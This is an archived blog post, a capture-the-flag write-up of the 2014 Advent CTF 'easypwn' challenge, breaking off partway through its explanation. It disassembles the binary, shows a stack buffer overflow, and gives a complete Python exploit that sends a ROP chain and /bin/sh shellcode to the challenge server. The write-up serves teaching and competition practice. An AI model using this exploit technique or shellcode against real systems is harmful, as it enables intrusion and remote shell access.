@@ -1,0 +1,692 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Advent CTF 2014 - Easypwn - staring into /dev/null</title>
+  <meta name="author" content="barrebas">
+
+  
+  <meta name="description" content="Another pwnable, named &ldquo;easypwn&rdquo;, no less! Should be a walk in the park, right? Of course, it turns out it wasn&rsquo;t! We&rsquo;re &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://barrebas.github.io/blog/2014/12/21/advent-ctf-easypwn">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="staring into /dev/null" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">staring into /dev/null</a></h1>
+  
+    <h2>barrebas</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:barrebas.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Advent CTF 2014 - Easypwn</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-12-21T10:24:42+01:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>21</span><span class='date-suffix'>st</span>, <span class='date-year'>2014</span></span> <span class='time'>10:24 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Another pwnable, named &ldquo;easypwn&rdquo;, no less! Should be a walk in the park, right?</p>
+
+<!-- more -->
+
+
+<p>Of course, it turns out it wasn&rsquo;t! We&rsquo;re given only the executable. The challenge description informs us: no libs, ASLR enabled. Flag is in <code>/home/easypwn/flag</code>. Great! Disassembling the binary leads to the following code:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/adventctf<span class="nv">$ </span>objdump -d easypwn -M intel
+</span><span class='line'>
+</span><span class='line'>easypwn:     file format elf32-i386
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Disassembly of section .text:
+</span><span class='line'>
+</span><span class='line'><span class="m">08048080</span> &lt;syscall&gt;:
+</span><span class='line'> 8048080: 8b <span class="m">54</span> <span class="m">24</span> 0c           mov    edx,DWORD PTR <span class="o">[</span>esp+0xc<span class="o">]</span>
+</span><span class='line'> 8048084: 8b 4c <span class="m">24</span> <span class="m">08</span>           mov    ecx,DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>
+</span><span class='line'> 8048088: 8b 5c <span class="m">24</span> <span class="m">04</span>           mov    ebx,DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>
+</span><span class='line'> 804808c: <span class="nb">cd </span><span class="m">80</span>                    int    0x80
+</span><span class='line'> 804808e: c3                      ret
+</span><span class='line'> 804808f: <span class="m">90</span>                       nop
+</span><span class='line'>
+</span><span class='line'><span class="m">08048090</span> &lt;pwn_me&gt;:
+</span><span class='line'> 8048090: <span class="m">83</span> ec <span class="m">10</span>              sub    esp,0x10
+</span><span class='line'> 8048093: b9 ed <span class="m">80</span> <span class="m">04</span> <span class="m">08</span>         mov    ecx,0x80480ed
+</span><span class='line'> 8048098: b8 <span class="m">04</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          mov    eax,0x4          <span class="c"># write</span>
+</span><span class='line'> 804809d: 6a <span class="m">08</span>                    push   0x8
+</span><span class='line'> 804809f: <span class="m">51</span>                       push   ecx
+</span><span class='line'> 80480a0: 6a <span class="m">01</span>                    push   0x1              <span class="c"># stdout</span>
+</span><span class='line'> 80480a2: ff d6                   call   esi
+</span><span class='line'> 80480a4: <span class="m">83</span> c4 0c                 add    esp,0xc
+</span><span class='line'> 80480a7: <span class="m">89</span> e1                    mov    ecx,esp
+</span><span class='line'> 80480a9: b8 <span class="m">03</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          mov    eax,0x3          <span class="c"># read</span>
+</span><span class='line'> 80480ae: <span class="m">68</span> <span class="m">80</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   0x80             <span class="c"># 128 bytes</span>
+</span><span class='line'> 80480b3: <span class="m">51</span>                       push   ecx
+</span><span class='line'> 80480b4: 6a <span class="m">00</span>                    push   0x0              <span class="c"># stdin</span>
+</span><span class='line'> 80480b6: ff d6                   call   esi
+</span><span class='line'> 80480b8: <span class="m">83</span> c4 0c                 add    esp,0xc
+</span><span class='line'> 80480bb: <span class="m">83</span> c4 <span class="m">10</span>              add    esp,0x10
+</span><span class='line'> 80480be: c3                      ret
+</span><span class='line'> 80480bf: <span class="m">90</span>                       nop
+</span><span class='line'>
+</span><span class='line'>080480c0 &lt;_start&gt;:
+</span><span class='line'> 80480c0: <span class="m">56</span>                       push   esi
+</span><span class='line'> 80480c1: be <span class="m">80</span> <span class="m">80</span> <span class="m">04</span> <span class="m">08</span>          mov    esi,0x8048080
+</span><span class='line'> 80480c6: e8 c5 ff ff ff          call   <span class="m">8048090</span> &lt;pwn_me&gt;
+</span><span class='line'> 80480cb: b9 f6 <span class="m">80</span> <span class="m">04</span> <span class="m">08</span>         mov    ecx,0x80480f6
+</span><span class='line'> 80480d0: b8 <span class="m">04</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          mov    eax,0x4          <span class="c"># write</span>
+</span><span class='line'> 80480d5: 6a <span class="m">13</span>                    push   0x13             <span class="c"># 0x13 bytes</span>
+</span><span class='line'> 80480d7: <span class="m">51</span>                       push   ecx
+</span><span class='line'> 80480d8: 6a <span class="m">01</span>                    push   0x1              <span class="c"># stdout</span>
+</span><span class='line'> 80480da: ff d6                   call   esi
+</span><span class='line'> 80480dc: <span class="m">83</span> c4 0c                 add    esp,0xc
+</span><span class='line'> 80480df: b8 <span class="m">01</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          mov    eax,0x1          <span class="c"># exit</span>
+</span><span class='line'> 80480e4: 6a <span class="m">00</span>                    push   0x0
+</span><span class='line'> 80480e6: ff d6                   call   esi
+</span><span class='line'> 80480e8: <span class="m">83</span> c4 <span class="m">04</span>              add    esp,0x4
+</span><span class='line'> 80480eb: 5e                      pop    esi
+</span><span class='line'> 80480ec: c3                      ret
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>That&rsquo;s not a whole lot to work with. Running it gives a clue on what to do:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/adventctf<span class="nv">$ </span><span class="nb">ulimit</span> -c unlimited
+</span><span class='line'>bas@tritonal:~/adventctf<span class="nv">$ </span>./easypwn
+</span><span class='line'>pwn me: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH
+</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
+</span><span class='line'>bas@tritonal:~/adventctf<span class="nv">$ </span>gdb ./easypwn core
+</span><span class='line'>...snip...
+</span><span class='line'>Core was generated by <span class="s1">&#39;./easypwn&#39;</span>.
+</span><span class='line'>Program terminated with signal 11, Segmentation fault.
+</span><span class='line'><span class="c">#0  0x45454545 in ?? ()</span>
+</span><span class='line'>gdb-peda<span class="nv">$ </span>checksec
+</span><span class='line'>CANARY    : disabled
+</span><span class='line'>FORTIFY   : disabled
+</span><span class='line'>NX        : ENABLED
+</span><span class='line'>PIE       : disabled
+</span><span class='line'>RELRO     : disabled
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>OK, so it&rsquo;s a buffer overflow, yet stack is not executable. The program uses no libraries but syscalls to do its work. We must be able to ROP our way to the flag! We have the syscall gadget lined up for us at <code>0x08048080</code>. Looks easy, right? Wrong!</p>
+
+<p>There is one <strong>big</strong> problem:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="m">08048080</span> &lt;syscall&gt;:
+</span><span class='line'> 8048080: 8b <span class="m">54</span> <span class="m">24</span> 0c           mov    edx,DWORD PTR <span class="o">[</span>esp+0xc<span class="o">]</span>
+</span><span class='line'> 8048084: 8b 4c <span class="m">24</span> <span class="m">08</span>           mov    ecx,DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>
+</span><span class='line'> 8048088: 8b 5c <span class="m">24</span> <span class="m">04</span>           mov    ebx,DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>
+</span><span class='line'> 804808c: <span class="nb">cd </span><span class="m">80</span>                    int    0x80
+</span><span class='line'> 804808e: c3                      ret
+</span><span class='line'> 804808f: <span class="m">90</span>                       nop
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We have <em>no way</em> to set <code>eax</code>! The <code>eax</code> register contains the syscall number and is kind of crucial to what we want. I uploaded the binary to <a href="https://ropshell.com">ropshell.com</a> but I found no straightforward way to set <code>eax</code>. I&rsquo;d prefer a <code>mov eax</code> or <code>pop eax</code>, or even <code>sub eax</code> or <code>xor eax</code>. Anything, really! I dumped the ROP gadgets with <a href="https://gist.github.com/barrebas/4fc86eaf0e9b124813a3">my own tool</a> and found this little gadget:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>RET: 0x80480e9: les eax, <span class="o">[</span>esi+ebx*2<span class="o">]</span><span class="p">;</span> ret<span class="p">;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now this is a strange way to set <code>eax</code>. The <code>les</code> operand does the following: it loads the 48-bit value at the location of <code>esi+ebx*2</code> and sets <code>eax</code> to the first 32 bits and the <code>es</code> register to the last 16 bits. <em>However</em>, <code>es</code> does not tolerate just any old value. If the wrong value is passed, the program SEGFAULTS. To keep things simple, I looked for values in the binary like this: <code>0x0000000i, 0x0000</code>. This would load 0xi in <code>eax</code> and 0x0 in <code>es</code>.</p>
+
+<p>It seemed nearly impossible to build a ROP chain that would open, read and write the data from the flag file. For instance, where would I write the filename? On the stack? ASLR is enabled so I&rsquo;d have no idea of knowing where the stack is. Instead, I went with a different strategy.</p>
+
+<p>I am going to use the syscall <code>mprotect</code> to make the code section from 0x8048000 to 0x8049000 writeable. When this succeeds, I can use syscall <code>read</code> to read in any shellcode from stdin to the code section. Finally, I simply return to that region.</p>
+
+<p>A problem here is that I can&rsquo;t set <code>eax</code> to 125 (==mprotect) with my little gadget. Instead, I re-use the return value of the last syscall before the buffer overflow: <code>read</code>! The return value of that syscall will be the number of bytes read&hellip; If we pass in 125 bytes as payload, then we get exactly the syscall number of mprotect in <code>eax</code>!</p>
+
+<p>Here&rsquo;s what I came up with, bit by bit. I started the binary via socat, to emulate the target system:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/adventctf<span class="nv">$ </span>socat TCP-LISTEN:28099,fork EXEC:./easypwn
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And this is the ROP chain I built:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">telnetlib</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">SYSCALL</span> <span class="o">=</span> <span class="mh">0x8048080</span>
+</span><span class='line'><span class="n">POPRET</span> <span class="o">=</span> <span class="mh">0x80480eb</span>  <span class="c"># pop esi; ret</span>
+</span><span class='line'><span class="n">ADDESP</span> <span class="o">=</span> <span class="mh">0x80480bb</span>  <span class="c"># add esp, 0x10; ret</span>
+</span><span class='line'><span class="n">LESEAX</span> <span class="o">=</span> <span class="mh">0x80480e9</span>  <span class="c"># les eax,FWORD PTR [esi+ebx*2]</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">16</span>       <span class="c"># smash stack!</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>   <span class="c"># I rely on the return value of the read syscall</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">ADDESP</span><span class="p">)</span>    <span class="c"># fix stack with add esp, 10; ret</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048000</span><span class="p">)</span>    <span class="c"># address to modify</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>   <span class="c"># length (page-aligned!)</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span>      <span class="c"># PROT_READ|PROT_WRITE|PROT_EXEC</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;AAAA&quot;</span>      <span class="c"># dummy value</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># reset ebx so we can set eax using the next gadget</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">ADDESP</span><span class="p">)</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>            <span class="c"># set ebx = 0</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>   <span class="c"># don&#39;t care</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span>      <span class="c"># don&#39;t care</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;AAAA&quot;</span>      <span class="c"># dummy</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># set eax = 3</span>
+</span><span class='line'><span class="c"># 0x804834a:  0x00000003  0x00000000</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POPRET</span><span class="p">)</span>    <span class="c"># pop esi; ret</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x804834a</span><span class="p">)</span> <span class="c"># set esi = 0x804834a</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">LESEAX</span><span class="p">)</span>    <span class="c"># eax -&gt; 0x3 == syscall_read</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">ADDESP</span><span class="p">)</span>    <span class="c"># fix stack</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>            <span class="c"># stdin</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048000</span><span class="p">)</span>    <span class="c"># address of buffer</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>        <span class="c"># number of bytes to read</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;BBBB&quot;</span>      <span class="c"># dummy value</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048000</span><span class="p">)</span>    <span class="c"># return to shellcode!</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># payload length must be 125, because after read, the next</span>
+</span><span class='line'><span class="c"># syscall is mprotect; eax = 125</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">125</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'><span class="c">#s.connect((&quot;localhost&quot;,28099))</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&quot;pwnable.katsudon.org&quot;</span><span class="p">,</span><span class="mi">28099</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># http://www.shell-storm.org/shellcode/files/shellcode-851.php</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># the shell should have been spawned, so interact with it</span>
+</span><span class='line'><span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
+</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
+</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This first bit of python sets up the exploit. I have a helper function called <code>p(x)</code> that can dump addresses in the correct endianness into the payload. First, the payload consists of 16 bytes to smash the stack. Then, the ROP chain starts. Finally, I made sure that the first payload is 125 bytes, so that <code>eax</code> will contain the correct syscall number for mprotect. This first important part of the ROP chain looks like this:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>    <span class="c"># I rely on the return value of the read syscall</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">ADDESP</span><span class="p">)</span>    <span class="c"># fix stack with add esp, 10; ret</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048000</span><span class="p">)</span>    <span class="c"># address to modify</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>   <span class="c"># length (page-aligned!)</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span>      <span class="c"># PROT_READ|PROT_WRITE|PROT_EXEC</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;AAAA&quot;</span>      <span class="c"># dummy value</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This will call <code>syscall(0x8048000, 0x1000, 0x7)</code> with <code>eax</code> set to 125. This makes the memory area at 0x8048000 writeable! Next, I need to read in the shellcode, but for that <code>eax</code> must be 3. I first reset <code>ebx</code>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># reset ebx so we can set eax using the next gadget</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">ADDESP</span><span class="p">)</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>            <span class="c"># set ebx = 0</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>   <span class="c"># don&#39;t care</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span>      <span class="c"># don&#39;t care</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;AAAA&quot;</span>      <span class="c"># dummy</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Whatever this syscall is (I don&rsquo;t know the value of <code>eax</code> after the mprotect call, nor do I care), it fails but the side-effect is that <code>ebx</code> is now 0. That sets us up for moving the correct number in <code>eax</code>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># set eax = 3</span>
+</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
+</span><span class='line'><span class="sd">0x804834a:   0x00000003  0x00000000</span>
+</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POPRET</span><span class="p">)</span>    <span class="c"># pop esi; ret</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x804834a</span><span class="p">)</span> <span class="c"># set esi = 0x804834a</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">LESEAX</span><span class="p">)</span>    <span class="c"># eax -&gt; 0x3 == syscall_read</span>
